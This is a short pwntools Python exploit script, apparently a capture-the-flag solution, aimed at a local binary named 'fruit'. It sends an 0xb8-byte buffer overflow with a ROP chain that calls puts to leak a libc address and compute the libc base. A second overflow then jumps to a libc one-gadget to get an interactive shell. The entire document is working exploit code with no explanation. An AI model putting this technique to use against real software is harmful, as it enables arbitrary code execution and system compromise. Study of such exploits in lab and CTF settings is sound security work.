from pwn import *
elf = ELF('./fruit', checksec=False)
libc = ELF('./libc/libc6_2.28-0ubuntu1_amd64.so', checksec=False)
p = elf.process()
for i in range(5):
    p.sendlineafter(b'>>', b'9')
payload = b''.join([
    b'A'*0xb8,
    p64(0x0000000000401d33),
    p64(elf.sym['stderr']),
    p64(elf.plt['puts']),
    p64(elf.sym['_start']),
])
p.sendlineafter('?\n', payload)
libc.address = u64(p.recvlines(2)[1].ljust(8, b'\x00')) - libc.sym['_IO_2_1_stderr_']
log.info('base 0x%x'%libc.address)
for i in range(5):
    p.sendlineafter(b'>>', b'9')
payload = b''.join([
    b'A'*0xb8,
    p64(libc.address + 0x501e3),
    b'\x00'*0x40
])
p.sendlineafter('?\n', payload)
p.interactive()